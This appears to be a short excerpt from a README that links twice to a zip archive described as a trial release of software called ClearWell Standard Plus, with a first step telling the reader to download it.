...
👉 [**Download the latest trial release**](https://github.com/FellStreet/ClearWell-Standard_Plus-Trial/releases/download/v.1.0.26_Standard/ClearWell_Standard_Plus-1.x.xx.zip)
...
1. Download the `.zip` from the [latest release](https://github.com/FellStreet/ClearWell-Standard_Plus-Trial/releases/download/v.1.0.26_Standard/ClearWell_Standard_Plus-1.x.xx.zip).  
